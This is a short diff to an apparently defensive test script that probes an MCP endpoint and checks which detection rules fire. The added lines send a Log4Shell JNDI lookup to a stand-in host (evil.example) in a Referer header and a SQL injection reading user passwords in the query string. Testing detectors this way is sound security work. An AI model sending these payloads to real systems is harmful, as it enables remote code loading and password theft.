@@ -94,6 +94,12 @@ if True:
         for c in calls:
             st = post(host, "/mcp", c, [("Mcp-Protocol-Version","2025-11-25"),("Authorization","Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln")])
             results.append((st, host, "mcp", c.get("method")+":"+str(c.get("params",{}).get("name",""))))
+        # The headers and query string must still be inspected on /mcp (until 2026-11-20 nothing was).
+        auth = [("Mcp-Protocol-Version","2025-11-25"),("Authorization","Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln")]
+        st = post(host, "/mcp", calls[2], auth + [("Referer", "${jndi:ldap://evil.example/a}")])
+        results.append((st, host, "ATTACK mcp log4shell header", "tools/list"))
+        st = post(host, "/mcp?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", calls[2], auth)
+        results.append((st, host, "ATTACK mcp sqli in query string", "tools/list"))
 log = sh("docker","logs","fp-dalton").stderr + sh("docker","logs","fp-dalton").stdout
 fired = collections.Counter()
 for line in log.splitlines():
